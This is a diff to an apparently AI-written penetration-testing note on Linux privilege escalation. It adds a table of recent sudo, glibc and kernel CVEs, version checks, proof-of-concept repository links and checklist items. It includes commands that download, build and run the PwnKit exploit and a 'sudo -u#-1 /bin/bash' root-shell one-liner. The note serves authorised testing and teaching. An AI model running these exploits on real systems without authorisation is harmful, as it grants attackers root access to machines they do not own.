@@ -1,6 +1,6 @@
 # Linux Privilege Escalation
 
-#Privesc #Linux #PrivilegeEscalation
+#Privesc #Linux #PrivilegeEscalation #SUID #Capabilities #Sudo #CronJobs #KernelExploits #ContainerEscape #linPEAS #pspy #GTFOBins
 
 ## What is this?
 
@@ -14,10 +14,10 @@ Common staging dir: `/tmp` or `/dev/shm` (in-memory, no disk writes)
 
 | Tool | Use |
 |------|-----|
-| [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) | Automated enumeration — finds most common vectors, color-coded output |
+| [[Tools/Scanning/linPEAS\|LinPEAS]] | Automated enumeration — finds most common vectors, color-coded output |
+| [[Tools/Scanning/pspy\|pspy]] | Monitor processes without root — catch cron jobs, scripts run by root |
+| [[Tools/Scanning/linux-exploit-suggester\|linux-exploit-suggester]] | Kernel/sudo/glibc version → CVE suggestions |
 | [LinEnum](https://github.com/rebootuser/LinEnum) | Legacy but solid — broad automated enumeration |
-| [linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester) | Kernel version → CVE suggestions |
-| [pspy](https://github.com/DominicBreuker/pspy) | Monitor processes without root — catch cron jobs, scripts run by root |
 | [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) | Python script, good for older systems |
 | [GTFOBins](https://gtfobins.github.io/) | Reference for abusing sudo/SUID/capabilities on common binaries |
 
@@ -800,34 +800,66 @@ searchsploit linux privilege escalation
 
 ### Notable kernel exploits
 
-| CVE | Name | Kernel versions |
+| CVE | Name | Affected versions |
 |-----|------|----------------|
-| CVE-2016-5195 | Dirty COW | 2.6.22 – 4.8.3 |
-| CVE-2022-0847 | Dirty Pipe | 5.8 – 5.16.11 |
+| CVE-2025-32463 | sudo `--chroot` NSS load | sudo 1.9.14 – 1.9.17 (fixed 1.9.17p1) |
+| CVE-2025-32462 | sudo `-h` host option | sudo < 1.9.17p1 |
+| CVE-2024-1086 | nf_tables use-after-free | kernel 5.14 – 6.6 (root cause back to 3.15) |
+| CVE-2023-4911 | Looney Tunables (glibc `ld.so`) | glibc 2.34 – 2.38 |
+| CVE-2022-0847 | Dirty Pipe | kernel 5.8 – 5.16.11 |
 | CVE-2021-4034 | PwnKit (pkexec) | All with Polkit |
 | CVE-2021-3156 | Baron Samedit (sudo) | sudo < 1.9.5p2 |
 | CVE-2019-14287 | sudo -1 bypass | sudo < 1.8.28 |
 | CVE-2019-18634 | sudo pwfeedback | sudo < 1.8.31 |
+| CVE-2016-5195 | Dirty COW | kernel 2.6.22 – 4.8.3 |
 
 ```bash
-# PwnKit (any Linux with Polkit installed, regardless of kernel)
-# Most reliable modern local privesc
+# Version checks that decide which of the above are even candidates
+uname -r                        # kernel
+sudo --version | head -1        # sudo
+ldd --version | head -1         # glibc
+```
+
+```bash
+# --- sudo chroot (CVE-2025-32463) — CISA KEV, works on DEFAULT builds ---
+# sudo -R honours config inside a user-controlled chroot, so it loads an
+# attacker-supplied NSS module as root. No sudoers entry needed.
+git clone https://github.com/kh4sh3i/CVE-2025-32463
+# Check first — this is the highest-value modern candidate:
+sudo --version | head -1        # 1.9.14 through 1.9.17 → vulnerable
+
+# --- nf_tables (CVE-2024-1086) — also CISA KEV, seen in ransomware ---
+# Needs unprivileged user namespaces enabled:
+cat /proc/sys/kernel/unprivileged_userns_clone   # 1 = exploitable path open
+sysctl kernel.unprivileged_userns_clone
+# PoC: https://github.com/Notselwyn/CVE-2024-1086
+
+# --- Looney Tunables (CVE-2023-4911) ---
+# Buffer overflow in ld.so via GLIBC_TUNABLES during SUID binary launch
+ldd --version | head -1          # glibc 2.34–2.38 → candidate
+# PoC: https://github.com/leesh3288/CVE-2023-4911
+
+# --- PwnKit (CVE-2021-4034) — any Linux with Polkit, regardless of kernel ---
 git clone https://github.com/ly4k/PwnKit
 cd PwnKit && make
 ./PwnKit
 
-# Dirty Pipe (Linux 5.8 – 5.16.11)
+# --- Dirty Pipe (kernel 5.8 – 5.16.11) ---
 # Overwrites SUID binary with shellcode → root shell
-# PoC at: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
+# PoC: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
 
-# Baron Samedit (sudo < 1.9.5p2)
+# --- Baron Samedit (sudo < 1.9.5p2) ---
 # Heap overflow in sudo — NOPASSWD not needed
 # PoC: https://github.com/blasty/CVE-2021-3156
 
-# sudo -1 bypass (sudo < 1.8.28)
+# --- sudo -1 bypass (sudo < 1.8.28) ---
 # If (ALL, !root) in sudoers:
 sudo -u#-1 /bin/bash
 ```
+
+> [!tip] Check **sudo and glibc versions before the kernel**. The sudo and glibc bugs (CVE-2025-32463, CVE-2023-4911, CVE-2021-3156) are userland — they're clean, reliable, and don't risk a panic, whereas kernel exploits do. A fully patched kernel on a box running sudo 1.9.15 is still an easy root.
+
+> [!warning] Kernel exploits can panic the host and drop your shell along with everyone else's. On a real engagement they're the last resort, after sudo/SUID/capabilities/cron have all come up empty — and worth flagging to the client before you fire one.
 
 ---
 
@@ -902,7 +934,10 @@ SUDO
 [ ] Check GTFOBins for any allowed binary
 [ ] Look for env_keep LD_PRELOAD in sudoers
 [ ] sudo -u#-1 if (ALL, !root) policy (CVE-2019-14287)
-[ ] sudo version: sudo --version (Baron Samedit if < 1.9.5p2)
+[ ] sudo version: sudo --version
+      < 1.9.5p2        → Baron Samedit (CVE-2021-3156)
+      1.9.14 – 1.9.17  → chroot NSS load (CVE-2025-32463) — no sudoers entry needed
+[ ] glibc version: ldd --version (2.34–2.38 → Looney Tunables CVE-2023-4911)
 
 SUID / SGID
 [ ] find / -perm -u=s -type f 2>/dev/null
@@ -939,10 +974,12 @@ CONTAINERS
 [ ] id | grep docker — docker group → instant root
 [ ] id | grep lxd — LXD group → host FS access
 
-KERNEL
+KERNEL (last resort — can panic the host)
 [ ] ./linux-exploit-suggester.sh
 [ ] Check for PwnKit (pkexec) — works on all distros with Polkit
 [ ] Dirty Pipe if kernel 5.8–5.16.11
+[ ] nf_tables (CVE-2024-1086) if kernel 5.14–6.6 AND unprivileged userns enabled
+      cat /proc/sys/kernel/unprivileged_userns_clone
 [ ] Run Metasploit: use post/multi/recon/local_exploit_suggester
 ```
 
@@ -951,5 +988,5 @@ KERNEL
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-07-21*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-07-30*
+*Model: claude-opus-5*
